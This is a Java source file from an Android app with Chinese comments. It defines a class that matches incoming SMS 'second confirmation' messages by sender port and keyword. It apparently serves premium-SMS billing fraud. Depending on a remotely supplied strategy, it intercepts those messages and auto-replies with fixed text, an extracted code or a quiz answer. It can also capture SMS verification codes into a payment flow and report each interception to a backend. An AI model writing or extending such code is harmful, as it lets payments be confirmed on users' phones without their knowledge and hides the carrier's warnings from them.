package com.example.sayid.myapplication.common.bean;

import android.content.Context;

import com.example.sayid.myapplication.common.data.ErrorCode;
import com.example.sayid.myapplication.common.data.Strings;
import com.example.sayid.myapplication.common.db2.BlockDao;
import com.example.sayid.myapplication.common.listener.SendSmsListener;
import com.example.sayid.myapplication.common.util.FutureUtil;
import com.example.sayid.myapplication.common.util.JsonUtil;
import com.example.sayid.myapplication.common.util.StringUtil;
import com.example.sayid.myapplication.common.util.UI;
import com.example.sayid.myapplication.model.ReportModel;
import com.example.sayid.myapplication.model.SmsQuestionModel;
import com.example.sayid.myapplication.parseStep.ParseStep;
import com.example.sayid.myapplication.parseStep.ParseStepBean;
import com.example.sayid.myapplication.parseStep.ParseStepBeanCache;
import com.example.sayid.myapplication.parseStep.step.action.GetSms;
import com.example.sayid.myapplication.pay.AppTache;
import com.example.sayid.myapplication.smsutil.SmSutils;

import org.json.JSONException;
import org.json.JSONObject;


/**
 * 二次确认拦截
 *
 * @author luozhi
 */
public class BlockSecondConfirm {
    private final static String TAG = "BlockSecondConfirm";

    /**
     * 拦截策略，
     * 0表示拦截并自动回复，
     * 1表示拦截提示用户
     * 2表示不拦截
     * 3表示拦截并存取
     */
    public int confirm_strategy = 2;

    /**
     * 二次确认类型，
     * 0为固定内容回复，
     * 1为随机密码回复，
     * 2为智能动态问题回复，
     * 3为无二次确认.当为3时，后面的confirm字段都为空
     * 4为短信内容上报
     */
    public int confirm_type = 3;
    /**
     * 二次确认下行端口，多个用|隔开
     */
    public String confirm_port;
    /**
     * 二次确认下行关键字，多个用|隔开
     */
    public String confirm_keyword;
    /**
     * 回复内容，动态时表示匹配模板，静态时为回复内容
     */
    public String confirm_content;
    /**
     * 是否首条确认，
     * 0表示首条，
     * 1表示逐条
     */
    public String confirm_first = "0";

    /**
     * 发送超时时间
     */
    public int send_sms_timeout;

    /**
     * 二次确认策略是否使用
     */
    public boolean confirm_bool = false;
    /**
     * 拦截的短信的端口
     */
    public String block_port = "";
    /**
     * 拦截的短信内容
     */
    public String block_sms = "";

    /**
     * Json解析
     *
     * @param jsonObj
     * @throws JSONException
     */
    public void parseJson(JSONObject jsonObj) throws JSONException {
        // 二次确认
        confirm_strategy = JsonUtil.isEmptyOrGetInt(jsonObj, "confirm_strategy", 2);
        confirm_type = JsonUtil.isEmptyOrGetInt(jsonObj, "confirm_type", 3);
        confirm_port = JsonUtil.isNullOrGetStr(jsonObj, "confirm_port");
        confirm_keyword = JsonUtil.isNullOrGetStr(jsonObj, "confirm_keyword");
        confirm_content = JsonUtil.isNullOrGetStr(jsonObj, "confirm_content");
        confirm_first = JsonUtil.isEmptyOrGetStr(jsonObj, "confirm_first", "0");
    }

    /**
     * 是否拦截
     *
     * @return
     */
    public boolean isBlock() {
        // 2 不拦截
        if (confirm_strategy != 2) {
            return true;
        }

        return false;
    }

    /**
     * 是否拦截二次确认
     *
     * @param context
     * @param user_order_id
     * @param pay_order_id
     * @param address
     * @param content
     * @return
     */
    public void confirmProcess(Context context, String user_order_id, String pay_order_id, String address, String content) {
//		System.out.println("confirm_strategy ===  "+ confirm_strategy );
        switch (confirm_strategy) {
            case 0: // 拦截并自动回复
                if (!confirm_bool) { // 策略使用完则只要拦截
                    confirmUpdate(context, user_order_id, pay_order_id, address, content);
                    confirmAutoReply(user_order_id, pay_order_id);
                } else {
                    confirmReport(user_order_id, pay_order_id, address, content);
                }

                break;

            case 1:   //拦截提示用户
                if (!confirm_bool) {           //策略使用完则只要拦截
                    confirmUpdate(context, user_order_id, pay_order_id, address, content);
                    UI.showAlertDialog(UI.DIALOG_3, context, user_order_id, pay_order_id, content + Strings.DIALOG_TWO, "", UI.DEAL_TYPE_3);
                } else {
                    confirmReport(user_order_id, pay_order_id, address, content);
                }

                break;

            case 2:   //不拦截

                break;

            case 3:  // 拦截短信验证码
                if (!confirm_bool) {           // 策略使用完则只要拦截
//					confirmUpdate(context, user_order_id, pay_order_id, address, content);
                    confirmBlockSms(user_order_id, pay_order_id, address, content);
                } else {
                    confirmReport(user_order_id, pay_order_id, address, content);
                }

                break;
        }

        return;
    }

    /**
     * 二次确认内容更新
     *
     * @param context
     * @param user_order_id
     * @param pay_order_id
     * @param address
     * @param content
     */
    public void confirmUpdate(Context context, String user_order_id, String pay_order_id, String address, String content) {
        confirm_bool = true; // 二次确认策略已经使用
        block_port = address;
        block_sms = content;

        // 更新拦截内容
        BlockDao blockDao = new BlockDao(context);
        blockDao.updateSecondConfirm(this, pay_order_id);
    }

    /**
     * 二次确认自动回复
     *
     * @param user_order_id
     * @param pay_order_id
     */
    public void confirmAutoReply(String user_order_id, String pay_order_id) {


        if (confirm_type == 3) {     //3为无二次确认.当为3时，后面的confirm字段都为空
            return;
        }

        switch (confirm_type) {
            case 0:            //0为固定内容回复
                sendConfirmSms(user_order_id, pay_order_id, block_port, confirm_content);
                break;
            case 1:            //1为随机密码回复
                String answer = StringUtil.getConfirmDynamicPasswordAll(block_sms, confirm_content);
                if (answer != null) {
                    sendConfirmSms(user_order_id, pay_order_id, block_port, answer);
                }
                break;
            case 2:            //2为智能动态问题回复
                String question = StringUtil.getConfirmSmartDynamicQuestion(block_sms, confirm_content);
                if (question != null) {
                    new SmsQuestionModel(null, pay_order_id, question, block_port).requestIQuestion();
                } else {
                    new SmsQuestionModel(null, pay_order_id, block_sms, block_port).requestIQuestion();
                }
                break;
        }
    }

    /**
     * 二次确认拦截短信验证码
     *
     * @param user_order_id
     * @param pay_order_id
     */
    private void confirmBlockSms(String user_order_id, String pay_order_id, String address, String content) {
        // 短信验证码拦截处理
        final ParseStepBean psb = ParseStepBeanCache.getInstance().get(pay_order_id);
        if (psb != null) {
            psb.append("\n<br>confirmBlockSms ParseStepBean find it, pay_order_id=" + pay_order_id);
            Object object = psb.getCurrentStep();
            if (object instanceof GetSms) {
                GetSms getSms = (GetSms) object;
                getSms.parseResponseParam(psb, address, content);

                ParseStep parseStep = new ParseStep() {
                    public ParseStepBean call() throws Exception {
                        nextStep(psb);
                        return psb;
                    }
                };
                FutureUtil.execute(parseStep);

            } else {
                psb.append("\n<br>confirmBlockSms ParseStepBean current step is not GetSms");
            }
        } else {
//			Logs.e(TAG, "confirmBlockSms ParseStepBean is null, pay_order_id=" + pay_order_id);
        }
    }


    /**
     * 发送二次确认的短信
     *
     * @param user_order_id
     * @param pay_order_id
     * @param send_port
     * @param send_sms
     */
    private void sendConfirmSms(String user_order_id, String pay_order_id, String send_port, String send_sms) {
//		SendSms sendSms = new SendSms(AppTache.context,  new SendSmsListener(){
//			public void onSendSmsSuccess(String user_order_id, String pay_order_id, String destPhone, String message, int times) {
//				StringBuffer sb = new StringBuffer("receivePort=");
//				sb.append(block_port).append(", receiveMsg=").append(block_sms)
//					.append("<br>destPort=").append(destPhone).append(", destMsg=").append(message).append(", status=成功");
//				ReportModel.getInstanse(AppTache.context).addReportConfirm(pay_order_id, 1, "1", "", sb.toString());
//			}
//			public void onSendSmsFailed(String user_order_id, String pay_order_id, String destPhone, String message, int items, String errorCode){
//				StringBuffer sb = new StringBuffer("receivePort=");
//				sb.append(block_port).append(", receiveMsg=").append(block_sms)
//					.append("<br>destPort=").append(destPhone).append(", destMsg=").append(message).append(", status=失败");
//				ReportModel.getInstanse(AppTache.context).addReportConfirm(pay_order_id, 1, "2", errorCode, sb.toString());
//			}
//		});
//
//		sendSms.sendSms(user_order_id, pay_order_id, send_port, send_sms, send_sms_timeout);
        try {
            SmSutils.sendSMS(user_order_id, pay_order_id, send_port, send_sms, new SendSmsListener() {
                public void onSendSmsSuccess(String user_order_id, String pay_order_id, String destPhone, String message, int times) {
                    StringBuffer sb = new StringBuffer("receivePort=");
                    sb.append(block_port).append(", receiveMsg=").append(block_sms)
                            .append("<br>destPort=").append(destPhone).append(", destMsg=").append(message).append(", status=成功");
                    ReportModel.getInstanse(AppTache.context).addReportConfirm(pay_order_id, 1, "1", "", sb.toString());
                }

                public void onSendSmsFailed(String user_order_id, String pay_order_id, String destPhone, String message, int items, String errorCode) {
                    StringBuffer sb = new StringBuffer("receivePort=");
                    sb.append(block_port).append(", receiveMsg=").append(block_sms)
                            .append("<br>destPort=").append(destPhone).append(", destMsg=").append(message).append(", status=失败");
                    ReportModel.getInstanse(AppTache.context).addReportConfirm(pay_order_id, 1, "2", errorCode, sb.toString());
                }
            });
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /**
     * 二次确认上报
     *
     * @param user_order_id
     * @param pay_order_id
     * @param number
     * @param text
     */
    public void confirmReport(String user_order_id, String pay_order_id, String number, String text) {
        StringBuffer sb = new StringBuffer("receivePort=");
        sb.append(number).append(", receiveMsg=").append(text).append(", status=失败,二次确认无回复");

        ReportModel.getInstanse(AppTache.context).addReportConfirm(pay_order_id, 1, "2", ErrorCode.CODE_114015, sb.toString());
    }

    @Override
    public String toString() {
        StringBuffer str = new StringBuffer();
        str.append("confirm_strategy=").append(confirm_strategy)
                .append(",confirm_type=").append(confirm_type)
                .append(",confirm_first=").append(confirm_first)
                .append(",send_sms_timeout=").append(send_sms_timeout)
                .append("\n<br>confirm_port=").append(confirm_port)
                .append(",confirm_keyword=").append(confirm_keyword)
                .append(",confirm_content=").append(confirm_content)
                .append("\n<br>confirm_bool=").append(confirm_bool)
                .append(",block_port=").append(block_port)
                .append(",block_sms=").append(block_sms);

        return str.toString();
    }


    /**
     * 二次确认是否匹配
     *
     * @param address
     * @param content
     * @return
     */
    public boolean isMatch(String address, String content) {
        //匹配端口，二次确认下行端口，多个用|隔开
        boolean isMatchPort = false;
        String[] confirmPortArray = confirm_port.split("\\|");
        for (String str : confirmPortArray) {
            if (address.contains(str.trim()) && !str.equals("")) {
                isMatchPort = true;
                break;
            }
        }

        // 端口不匹配
        if (!isMatchPort) {
            return false;
        }

        // 匹配关键字， 二次确认下行关键字，多个用|隔开
        boolean isMatchKeyWord = false;
        String[] confirmKeyWordArray = confirm_keyword.split("\\|");
        if (content == null) {
            isMatchKeyWord = true;
        } else if ("".equals(confirm_keyword)) {
            isMatchKeyWord = true; // 配置了关键字才匹配，不配置不匹配
        } else {
            for (String str : confirmKeyWordArray) {
                if (content.contains(str.trim()) && !str.equals("")) { // 关键字也能匹配上
                    isMatchKeyWord = true;
                    break;
                }
            }
        }

        // 关键字不匹配
        if (!isMatchKeyWord) {
            return false;
        }

        // 解决智能问答短信有时不止一条，可能有些短信里不含问题关键字
        if (isMatchPort && confirm_type == 2) {
//			Logs.d(TAG, "智能问答短信有时不止一条，可能有些短信里不含问题关键字");

            return true;
        }

        return true;
    }
}
